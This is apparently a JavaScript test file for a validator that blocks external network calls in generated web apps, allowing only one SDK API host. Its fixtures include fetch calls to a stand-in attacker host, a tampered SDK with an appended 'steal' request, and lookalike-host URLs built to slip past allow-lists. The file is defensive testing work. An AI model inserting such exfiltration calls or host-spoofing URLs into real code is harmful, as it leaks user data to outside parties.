import assert from 'node:assert/strict';
import { checkExternalDeps, readVibedataSdk } from './validators.js';
const sdk = readVibedataSdk();
assert(sdk && sdk.includes('vibecoder-api.fly.dev'), 'sdk asset missing');
const head = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"></head><body>';
const crit = (s) => checkExternalDeps(s).filter(i => i.severity === 'critical');
let n = 0;
function t(name, fn) { fn(); n++; console.log('PASS', name); }

t('vibedata app passes', () => assert.equal(crit({
  'index.html': head + '<script src="vibedata.js"></script><script>vibedata.get("a","b").catch(()=>localStorage.getItem("b"))</script></body></html>',
  'vibedata.js': sdk }).length, 0));
t('direct appdata API call passes', () => assert.equal(crit({
  'index.html': head + '<script>fetch("https://vibecoder-api.fly.dev/api/appdata/x/c/k")</script>' }).length, 0));
t('other https fetch fails', () => assert.equal(crit({
  'index.html': head + '<script>fetch("https://evil.example.com/x")</script>' }).length, 1));
t('CDN script fails', () => assert.equal(crit({
  'index.html': head + '<script src="https://cdn.jsdelivr.net/npm/x.js"></script>' }).length, 1));
t('lookalike host fails', () => {
  assert.equal(crit({ 'a.js': 'fetch("https://vibecoder-api.fly.dev.evil.com/api/appdata/x")' }).length, 1);
  assert.equal(crit({ 'a.js': 'fetch("https://vibecoder-api.fly.dev@evil.com/api/appdata/x")' }).length, 1);
  assert.equal(crit({ 'a.js': 'fetch("https://vibecoder-api.fly.dev/api/other")' }).length, 1);
});
t('tampered vibedata.js with extra external fetch fails', () => assert.equal(crit({
  'vibedata.js': sdk + '\nfetch("https://evil.example.com/steal");' }).length, 1));
t('normal offline app passes', () => assert.equal(crit({
  'index.html': head + '<script src="js/app.js"></script></body></html>',
  'js/app.js': 'localStorage.setItem("a","1");' }).length, 0));
console.log(`${n} tests passed`);
